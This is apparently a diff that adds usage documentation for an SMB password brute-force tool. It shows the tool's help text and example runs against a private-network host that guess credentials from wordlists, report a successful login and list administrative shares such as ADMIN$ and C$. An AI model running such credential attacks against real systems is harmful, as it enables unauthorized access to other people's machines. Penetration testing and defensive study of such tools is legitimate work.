@@ -1,0 +1,74 @@
+# ./smb-brute-force.py -h
+usage: smb-brute-force.py [-h] -ip IP -port PORT
+                          (-username USERNAME | -userfile USERFILE)
+                          (-password PASSWORD | -passwordfile PASSWORDFILE)
+                          [-domain DOMAIN] [-listshares] [-timeout TIMEOUT]
+                          [-v]
+
+Brute forcing does not work properly if unauthorized logins
+are mapped  to guest logins. This might happen on Windows XP
+and on Linux systems  when "map to guest" is enabled.
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -ip IP                e.g. 192.168.0.1
+  -port PORT            e.g. 139
+  -username USERNAME    e.g. administrator
+  -userfile USERFILE    e.g. users.txt
+  -password PASSWORD    e.g. secret
+  -passwordfile PASSWORDFILE
+                        e.g. passwords.txt
+  -domain DOMAIN        e.g. WORKGROUP
+  -listshares           list SMB shares
+  -timeout TIMEOUT      default 5
+  -v
+
+
+
+
+
+# ./smb-brute-force.py -ip 192.168.170.112 -port 445 -userfile users.txt -passwordfile passwords 
+success: [user:password]
+
+
+
+
+# ./smb-brute-force.py -ip 192.168.170.112 -port 445 -userfile users.txt -passwordfile passwords -v
+failed: [administrator:123456]
+failed: [administrator:secret]
+failed: [administrator:password]
+failed: [administrator:passwort]
+failed: [test:123456]
+failed: [test:secret]
+failed: [test:password]
+failed: [test:passwort]
+failed: [user:123456]
+failed: [user:secret]
+success: [user:password]
+failed: [user:passwort]
+
+
+
+
+# ./smb-brute-force.py -ip 192.168.170.112 -port 445 -userfile users.txt -passwordfile passwords -listshares
+success: [user:password]
+share: ADMIN$
+   comments: Remote Admin
+   type: Disk
+   isSpecial: True
+   isTemporary: False
+share: C$
+   comments: Default share
+   type: Disk
+   isSpecial: True
+   isTemporary: False
+share: IPC$
+   comments: Remote IPC
+   type: IPC
+   isSpecial: True
+   isTemporary: False
+share: Users
+   comments: 
+   type: Disk
+   isSpecial: False
+   isTemporary: False
